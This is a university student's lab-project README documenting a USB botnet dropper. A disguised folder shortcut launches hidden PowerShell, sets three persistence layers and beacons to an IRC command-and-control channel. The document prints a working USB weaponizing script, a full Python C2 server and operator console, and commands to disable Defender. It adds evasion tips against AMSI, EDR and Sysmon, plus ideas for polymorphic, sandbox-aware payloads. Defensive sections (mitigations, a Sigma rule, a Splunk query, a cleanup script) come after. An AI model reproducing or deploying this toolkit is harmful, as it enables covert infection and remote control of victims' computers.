# 🔌 CTI Lab Project 05 — Malicious USB Botnet Malware Dropper

<div align="center">

<img src="assets/air_university_logo.png" alt="Air University" width="300"/>

![Security](https://img.shields.io/badge/Category-Penetration%20Testing-red?style=for-the-badge&logo=shield)
![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=for-the-badge&logo=windows)
![C2](https://img.shields.io/badge/C2-Python%20IRC-green?style=for-the-badge&logo=python)
![Status](https://img.shields.io/badge/Status-Educational%20PoC-orange?style=for-the-badge)
![License](https://img.shields.io/badge/Use-Authorized%20Lab%20Only-critical?style=for-the-badge)

> **⚠️ CONFIDENTIAL — For Authorized Use Only**
> This project is strictly for educational and defensive cybersecurity research within an isolated lab environment.

**Muhammad Abdullah Siddiqui | 233037 | BSCYS EV 6B | Air University**

</div>

---

## 📋 Table of Contents

- [Introduction](#-introduction)
- [Literature Review](#-literature-review--background-research)
- [System Design](#-system-design--implementation-plan)
- [Proof-of-Concept Implementation](#-proof-of-concept-implementation)
- [Testing & Validation](#-testing--validation)
- [Security & Countermeasure Analysis](#-security--countermeasure-analysis)
- [Ethical & Legal Considerations](#-ethical--legal-considerations)
- [Summary & Conclusion](#-summary--conclusion)
- [Appendices](#-appendices)

---

## 🎯 Introduction

### Project Scope & Objectives

This project demonstrates how a **standard USB flash drive** can be weaponized into a malicious malware dropper that:

| # | Capability |
|---|-----------|
| 1 | Delivers a payload within **~10 seconds** of the user double-clicking a disguised folder shortcut |
| 2 | Establishes **persistence** via Registry Run keys, Scheduled Tasks, and Startup Folder |
| 3 | **Beacons home** to a custom Python-based IRC Command & Control (C2) channel |
| 4 | **Accepts remote commands** from the botnet operator |
| 5 | **Self-propagates** to any other USB drives connected to the infected machine |

### Primary Objectives

- 🎯 Demonstrate the full lifecycle of a USB-borne botnet attack using a regular USB flash drive
- 🖥️ Implement a functional C2 channel using the IRC protocol via a lightweight Python server
- 🪤 Use the **folder confusion attack** — the most reliable social engineering USB technique
- 🔐 Explore UAC bypass techniques for privilege escalation
- 🛡️ Document detection and mitigation strategies

### Hardware / Software Requirements

| Component | Purpose |
|-----------|---------|
| Regular USB flash drive | Delivery vehicle for malware |
| Windows 10/11 VM | Victim machine |
| Kali Linux VM | C2 server (Python IRC) |
| VirtualBox / VMware | Hypervisor for isolated lab |

---

## 📚 Literature Review & Background Research

### USB Attack Vectors in the Wild

USB-based attacks remain a **persistent and growing threat**. The 2024 Honeywell GARD USB Threat Report found that **51% of USB-based threats** involve script execution (PowerShell, VBS) and command-line interface abuse.

#### Real-World Campaigns

| Campaign | Year | Technique |
|----------|------|-----------|
| **USBFect Worm** | 2025–2026 | Disguised folder shortcuts → drops Claimloader/ColorDrama → executes LingerRAT shellcode |
| **CoinMiner USB Campaign** | Late 2025 | Auto-executed hidden files deploying Hworm, Brute Ratel, AsyncRAT |
| **Stuxnet** | 2010 | LNK exploits to jump air-gapped networks; destroyed Iranian centrifuges |
| **Agent.BTZ** | 2008 | Russian military malware spread via USB through US CENTCOM using disguised shortcuts |

#### Social Engineering Statistics

```
📊 University of Illinois study:   45–60% of found USB drives are plugged in by strangers
📊 Black Hat USA research:          40% infection rate from USB drives left in parking lots
📊 Penetration tests confirm:       Folder confusion has the HIGHEST click-through rate of any USB decoy
```

---

### Botnet Architectures & IRC C2

| Type | Examples | Pros | Cons |
|------|----------|------|------|
| Centralized | Agobot, SDBot, GTBot | Real-time, simple | Single point of failure |
| Centralized (HTTP) | Zeus, Emotet | Blends with web traffic | Polling delays |
| P2P | ZeroAccess, GameOver Zeus | Resilient | Complex implementation |
| Hybrid | Proposed designs | Redundancy | Complex engineering |

### Relevant Malware Families

| Malware | C2 Type | USB Spread | Notable Technique |
|---------|---------|------------|-------------------|
| USBFect | HTTP | ✅ Yes | Disguised folder `.lnk` + registry persistence |
| AsyncRAT | TCP | Via dropper | Remote admin + keylogging |
| Stuxnet | P2P/HTTP | ✅ Yes (LNK exploit) | Air-gap jumping via USB |
| Agent.BTZ | HTTP | ✅ Yes | Military network compromise |
| WarzoneRAT | HTTP | ❌ No | sdclt.exe UAC bypass |

---

## 🏗️ System Design & Implementation Plan

### Overall Architecture

![Architecture Diagram](assets/architecture_diagram.png)

---

### USB Attack Vector — Folder Confusion

The attack relies on **human psychology** rather than system exploitation.

#### What the victim sees:

![USB Visible Contents](assets/usb_visible_contents.png)

#### What is actually hidden on the USB:

![USB Hidden Contents](assets/usb_hidden_contents.png)

#### Why It Works

1. **User plugs in USB** → Windows opens it in File Explorer
2. **Single visible item**: a folder icon labeled "USB Drive E"
3. They **double-click** it thinking "I need to open the drive to see files"
4. Instead, the shortcut **launches `launch.bat`**, which executes PowerShell silently
5. The dropper **executes silently** in the background

> **Why `.bat` intermediary?** Direct PowerShell embedding in `.lnk` Arguments causes parser errors due to nested quotes. The `.bat` file resolves all quoting issues and ensures reliable execution.

---

### Payload Delivery Timeline

![Payload Delivery Timeline](assets/payload_delivery_timeline.png)

---

### Two-Stage Payload Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    STAGE 0 — Dropper (payload.ps1)          │
│  • Copies Stage 1 beacon to %APPDATA%\Microsoft\Windows\    │
│  • Establishes all 3 persistence mechanisms                  │
│  • Launches the beacon  •  Self-destructs traces             │
└─────────────────────────┬───────────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────────┐
│              STAGE 1 — Beacon (update.ps1)                  │
│  • Connects to IRC C2 server at 192.168.1.16:6667           │
│  • Joins #botnet  •  Parses !exec !list !die !screenshot    │
│  • Returns command output  •  Reconnects on failure          │
└─────────────────────────────────────────────────────────────┘
```

---

### Command & Control Infrastructure

- **C2 Server:** Custom Python IRC server on Kali Linux (`192.168.1.16:6667`)
- **Channel:** `#botnet`

| Command | Format | Description |
|---------|--------|-------------|
| Execute | `!exec <cmd>` | Runs `cmd.exe` command via beacon |
| List | `!list` | Bot reports hostname, user, OS |
| Screenshot | `!screenshot` | Captures desktop, saves to `%TEMP%` |
| Disconnect | `!die` | Terminates beacon process |

---

### Persistence Mechanisms (Three Layers)

#### Layer 1 — Registry Run Key (HKCU)

![Persistence Layer 1 - Registry](assets/persistence_layer1_registry.png)

#### Layer 2 — Scheduled Task (SYSTEM context)

![Persistence Layer 2 - Scheduled Task](assets/persistence_layer2_scheduled_task.png)

#### Layer 3 — Startup Folder (Current User)

![Persistence Layer 3 - Startup Folder](assets/persistence_layer3_startup_folder.png)

---

## 💻 Proof-of-Concept Implementation

### 4.1 USB Preparation Script

```powershell
# Clean up
Remove-Item "E:\payload.ps1","E:\stage1_beacon.ps1","E:\USB Drive E.lnk" -Force -ErrorAction SilentlyContinue

# STEP 1: Write the Stage 1 beacon
@" ... beacon PowerShell code connecting to IRC C2 ... "@ | Set-Content -Path "E:\stage1_beacon.ps1" -Force

# STEP 2: Write the Stage 0 dropper
@" ... dropper copies beacon, sets persistence, launches beacon ... "@ | Set-Content -Path "E:\payload.ps1" -Force

# STEP 3: Create the folder-confusion shortcut
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("E:\USB Drive E.lnk")
$shortcut.TargetPath   = "powershell.exe"
$shortcut.Arguments    = '-w hidden -nop -ep bypass -c "iex (Get-Content E:\payload.ps1 -Raw)"'
$shortcut.IconLocation = "%SystemRoot%\System32\imageres.dll,3"
$shortcut.Description  = "USB Drive"
$shortcut.Save()

# STEP 4: Hide the payload files
$hidden = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
Set-ItemProperty -Path "E:\payload.ps1"         -Name Attributes -Value $hidden
Set-ItemProperty -Path "E:\stage1_beacon.ps1"   -Name Attributes -Value $hidden
```

---

### 4.2 C2 Server — Python IRC Implementation

> A **custom Python-based IRC server** was used instead of UnrealIRCd — no external dependencies, same functionality on port 6667.

![Kali C2 Server Terminal](assets/kali_c2_server_terminal.png)

```python
#!/usr/bin/env python3
import socket, threading

clients = {}

def handle_client(conn, addr):
    nick, channel = None, "#botnet"
    conn.send(b":server 001 * :Welcome to CTI Lab C2\r\n")
    while True:
        try:
            data = conn.recv(4096).decode(errors='ignore')
            if not data: break
            for line in data.split('\r\n'):
                if not line: continue
                if line.upper().startswith("NICK "):
                    nick = line.split()[1]; clients[conn] = nick
                elif line.upper().startswith("JOIN "):
                    nick = clients.get(conn, "Unknown")
                    for c in clients: c.send(f":{nick}!user@host JOIN {channel}\r\n".encode())
                    print(f"[+] BOT JOINED: {nick}")
                elif "PRIVMSG" in line:
                    for c in list(clients.keys()):
                        if c != conn:
                            try: c.send(f":{nick or 'Unknown'}!user@host {line}\r\n".encode())
                            except: pass
                elif line.upper().startswith("PING "):
                    conn.send(f"PONG {line.split()[1]}\r\n".encode())
        except: break
    if conn in clients: del clients[conn]
    conn.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 6667)); server.listen(10)
    print("CTI LAB C2 SERVER RUNNING — 0.0.0.0:6667 — #botnet")
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__": main()
```

---

### 4.3 Python C2 Operator Console

```python
#!/usr/bin/env python3
import socket, threading, time, re

SERVER, PORT, NICK, CHANNEL = "127.0.0.1", 6667, "0p3r4t0r", "#botnet"

class C2Operator:
    def __init__(self): self.sock = socket.socket(); self.connected = False
    def connect(self):
        self.sock.connect((SERVER, PORT))
        self.sock.send(f"NICK {NICK}\r\nUSER {NICK} 0 * :Operator Console\r\n".encode())
        time.sleep(1); self.sock.send(f"JOIN {CHANNEL}\r\n".encode())
        self.connected = True
        threading.Thread(target=self.receive, daemon=True).start()
    def send_command(self, cmd): self.sock.send(f"PRIVMSG {CHANNEL} :!{cmd}\r\n".encode())
    def receive(self):
        while self.connected:
            try:
                for line in self.sock.recv(4096).decode(errors='ignore').split('\r\n'):
                    if line.startswith("PING"): self.sock.send(f"PONG {line.split()[1]}\r\n".encode())
                    if "PRIVMSG" in line and CHANNEL in line:
                        m = re.search(r':([^!]+)!.* PRIVMSG.*:(.*)', line)
                        if m and m.group(1) != NICK: print(f"[{m.group(1)}] {m.group(2)}")
            except: break
    def interactive(self):
        while True:
            try:
                cmd = input("C2> ").strip()
                if cmd.lower() in ["exit","quit"]: break
                self.send_command(cmd)
            except KeyboardInterrupt: break

if __name__ == "__main__":
    op = C2Operator(); op.connect(); op.interactive()
```

---

### 4.4 UAC Bypass Module

![UAC Bypass Module](assets/uac_bypass_module.png)

---

## 🧪 Testing & Validation

### Lab Environment Setup

| VM | OS | IP Address | Role |
|----|-----|-----------|------|
| VM1 | Kali Linux | `192.168.1.16` | C2 Server |
| VM2 | Windows 10/11 | `192.168.1.8` | Victim |

#### Step 1 — Prepare the Victim VM (disable Defender for PoC)

![Victim VM Setup](assets/victim_vm_setup.png)

![Defender Disabled](assets/defender_disabled.png)

#### Step 2 — Prepare the USB Drive

![USB Preparation Script](assets/usb_preparation_script.png)

#### Step 3 — Start the C2 Server & Operator Console

![C2 Server with Operator Joined](assets/c2_server_operator_joined.png)

![Operator Console Connected](assets/operator_console_connected.png)

#### Step 4 — Execute the Attack (double-click the USB folder icon)

![Windows USB File Explorer](assets/windows_usb_file_explorer.png)

Within ~10 seconds, the bot connects to the C2 channel:

![C2 Bot Connected](assets/c2_bot_connected.png)

#### Step 5 — Issue Commands to the Bot

![C2 Commands Executed](assets/c2_commands_executed.png)

![Operator Console Full Session](assets/operator_console_full_session.png)

---

### Two Bots Connected Simultaneously

![Two Bots Connected](assets/two_bots_connected.png)

---

### Attack Walkthrough Summary

| Step | Action | What Happens |
|------|--------|-------------|
| 1 | Attacker prepares USB | Hidden payloads + folder confusion `.lnk` written |
| 2 | USB dropped in target area | Victim finds USB |
| 3 | Victim plugs in USB | Windows opens in File Explorer |
| 4 | Victim sees "USB Drive E" folder icon | Only visible item |
| 5 | Victim double-clicks | `.lnk` → `launch.bat` → PowerShell hidden |
| 6–9 | Dropper runs silently | Beacon copied, 3 persistence layers created |
| 10 | Beacon connects to IRC | Bot joins `#botnet` |
| 11 | USB removed (~10s elapsed) | Infection fully persistent |
| 12–13 | Operator issues commands | Bot responds with system data |
| 14 | Victim reboots | Beacon auto-starts via persistence |

---

### Persistence Verification

![Persistence Verification](assets/persistence_verification.png)

---

## 🛡️ Security & Countermeasure Analysis

### Detection Mechanisms

| Detection Method | What It Catches | Effectiveness | Evasion |
|-----------------|-----------------|---------------|---------|
| Windows Defender (Real-time) | Suspicious PowerShell, `.lnk` execution | 🔴 High | Disable for testing; obfuscate in production |
| AMSI | PowerShell script content at runtime | 🟡 Medium | Base64 encoding + reflection bypass |
| ASR Rules | Block Office/PS child processes | 🔴 High | Test against specific ASR GUIDs |
| Network Monitoring | IRC traffic on port 6667 | 🟡 Medium | Switch to HTTPS/port 443 |
| Sysmon (Event ID 1) | Process creation logging | 🔴 High | LOLBins + parent PID spoofing |
| Sysmon (Event ID 11) | File creation in suspicious paths | 🟡 Medium | Use `%TEMP%` / `%APPDATA%` |
| EDR (CrowdStrike, SentinelOne) | Behavioral detection chains | 🔴 Very High | Custom C2 protocol required |
| USB Device Control | Blocks non-whitelisted USB devices | ✅ Complete | Not bypassable — policy dependent |

---

### Mitigation Strategies

| Priority | Mitigation | How It Blocks This Attack |
|----------|-----------|--------------------------|
| 🥇 1 | **USB Device Control** | Blocks unknown USB devices entirely |
| 🥈 2 | **AppLocker / WDAC** | Blocks unsigned PowerShell scripts from USB |
| 🥉 3 | **Disable AutoPlay via GPO** | Prevents automatic execution |
| 4 | **Constrained Language Mode** | Restricts PS; blocks `iex`, `New-Object COM` |
| 5 | **ASR Rules** | Kills the `.lnk → PS` process chain |
| 6 | **Network Egress Filtering** | Blocks outbound IRC port 6667 |
| 7 | **User Least Privilege** | Limits damage from standard user |
| 8 | **User Education & Training** | "Never plug in unknown USB drives" |
| 9 | **USB Scanning Stations** | Dedicated kiosk to scan USBs before use |

---

### PowerShell Hardening Policy

```powershell
# ScriptBlock Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    -Name "EnableScriptBlockLogging" -Value 1

# Protected Event Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ProtectedEventLogging" `
    -Name "EnableProtectedEventLogging" -Value 1

# Constrained Language Mode
[System.Environment]::SetEnvironmentVariable("PSLanguageMode", "ConstrainedLanguage", "Machine")

# Transcription
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" `
    -Name "EnableTranscripting" -Value 1
```

### Sigma Rule — USB Folder Confusion LNK Execution

```yaml
title: USB Folder Confusion LNK Execution
id: 8c6d7e3f-1a2b-4c5d-9e8f-0a1b2c3d4e5f
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - 'USB Drive'
      - '.lnk'
      - 'payload.ps1'
    ParentImage|endswith: '\explorer.exe'
  condition: selection
level: high
```

### Splunk Search — IRC C2 Beacon Detection

```spl
index=network src_ip=192.168.1.8 dest_port=6667 proto=tcp
| stats count by src_ip, dest_ip, dest_port
| where count > 10
| eval alert = "Possible IRC C2 Beacon detected"
```

---

## ⚖️ Ethical & Legal Considerations

### Authorization and Scope

- ✅ Isolated Windows and Linux VMs on bridged network (`192.168.1.0/24`)
- ✅ No production or third-party systems accessed
- ✅ Written authorization obtained before testing

### Ethical Hacking Principles

| Principle | How It Was Applied |
|-----------|-------------------|
| Authorization | Explicit written permission obtained |
| Scope limitation | Testing strictly within defined IP range |
| Minimal impact | No destructive payloads; no data exfiltration |
| Reversibility | Complete cleanup script provided |
| Responsible disclosure | Techniques documented for defensive education |

### Legal Context

> ⚠️ **These techniques are illegal if deployed without explicit authorization.**

| Jurisdiction | Law | Penalty |
|-------------|-----|---------|
| 🇺🇸 USA | Computer Fraud and Abuse Act (CFAA) | Up to 10 years |
| 🇬🇧 UK | Computer Misuse Act 1990 | Up to 10 years |
| 🇪🇺 EU | Directive 2013/40/EU | Up to 5 years |
| 🇨🇦 Canada | Criminal Code §342.1 | Up to 10 years |
| 🇦🇺 Australia | Cybercrime Act 2001 | Up to 10 years |

### Cleanup Script

```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsTrustedInstaller" -ErrorAction SilentlyContinue
schtasks /delete /tn "MicrosoftEdgeUpdateTask" /f 2>&1 | Out-Null
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:APPDATA\Microsoft\Windows\update.ps1" -Force -ErrorAction SilentlyContinue
Get-Process | Where-Object { $_.ProcessName -eq "powershell" -and $_.CommandLine -like "*update.ps1*" } | Stop-Process -Force -ErrorAction SilentlyContinue
Write-Host "[+] Cleanup complete. System returned to baseline."
```

---

## 📊 Summary & Conclusion

### Key Findings

| Finding | Detail |
|---------|--------|
| 🎭 **Folder Confusion is Highly Effective** | Highest USB drop click-through rate of any decoy technique |
| ⚡ **~10 Second Infection Window** | Full chain — copy, 3-layer persistence, C2 beacon, USB propagation |
| 🔒 **Three-Layer Persistence is Robust** | Survives reboots and partial cleanup; if one layer removed, others remain |
| 🐍 **Python IRC C2 Works Well** | No external dependencies; real-time command and control |
| 🦇 **`.bat` Intermediary Solves Quoting** | Eliminates parser errors in `.lnk` PowerShell embedding |
| 🔄 **Self-Propagation Creates Chain Reactions** | Each infected machine infects future USB drives automatically |

### Future Considerations

- 👻 **Fileless execution** — Reflective DLL injection, no PS1 written to disk
- 🔐 **Encrypted C2** — IRC over TLS or HTTPS with domain fronting
- 🎲 **DGA** — Dynamically generated C2 domains to evade blacklists
- 🕵️ **VM/Sandbox detection** — Check for hypervisor artifacts before executing
- 🔀 **Polymorphic payloads** — Unique hashes per USB to evade signature detection
- 🖥️ **Alternative HID** — Flipper Zero or Raspberry Pi Pico for keystroke injection

> This project demonstrates that a **standard USB flash drive** requires no special hardware, no zero-days, and no advanced programming skills to weaponize. It relies solely on **human curiosity** — the weakest link in any security system. Only a **defense-in-depth** approach can effectively mitigate USB-borne threats.

---

## 📎 Appendices

### Appendix A: File Listing

#### USB Drive Files

| File | Attributes | Purpose |
|------|------------|---------|
| `USB Drive E.lnk` | Visible | Folder confusion decoy |
| `launch.bat` | Hidden + System | Intermediary launcher |
| `payload.ps1` | Hidden + System | Stage 0 dropper |
| `stage1_beacon.ps1` | Hidden + System | Stage 1 IRC beacon |

#### Infected Machine Files

| File | Path | Purpose |
|------|------|---------|
| `update.ps1` | `%APPDATA%\Microsoft\Windows\` | Persistent beacon |
| `WindowsTrustedInstaller.exe` | `%APPDATA%\Microsoft\Windows\` | Persistence stub |
| `WindowsUpdate.lnk` | `%APPDATA%\...\Startup\` | Startup persistence |

### Appendix B: Quick-Start Commands

```bash
# Kali — Terminal 1
python3 irc_c2_server.py

# Kali — Terminal 2
python3 c2_operator.py
```

```powershell
# Windows VM — Disable Defender (PoC only)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -SubmitSamplesConsent 2
# Then run USB prep script from Section 4.1
# Double-click "USB Drive E" on USB → wait 10s → check C2 for bot
```

### Appendix C: Troubleshooting

| Symptom | Likely Cause | Solution |
|---------|-------------|---------|
| Parser error on shortcut double-click | Nested quotes in `.lnk` Arguments | Use `.bat` intermediary |
| Bot connects but ignores commands | IRC server not forwarding PRIVMSG | Use corrected server broadcast loop |
| Bot connects briefly then drops | Wrong C2 IP in beacon | Verify `192.168.1.16` matches Kali IP |
| No C2 connection at all | Defender/firewall blocking | `Set-MpPreference -DisableRealtimeMonitoring $true` |
| Shortcut shows wrong icon | Wrong IconLocation | Use `%SystemRoot%\System32\imageres.dll,3` |

---

<div align="center">

---

**CONFIDENTIAL — For Authorized Use Only**

*Strictly for educational and defensive cybersecurity research. Unauthorized use is illegal and unethical.*

**Muhammad Abdullah Siddiqui | 233037 | BSCYS EV 6B | Air University**

![Made with](https://img.shields.io/badge/Made%20with-Python%20%26%20PowerShell-blue?style=flat-square)
![Lab](https://img.shields.io/badge/Lab-Isolated%20VM%20Environment-green?style=flat-square)
![Purpose](https://img.shields.io/badge/Purpose-Defensive%20Education-orange?style=flat-square)

</div>
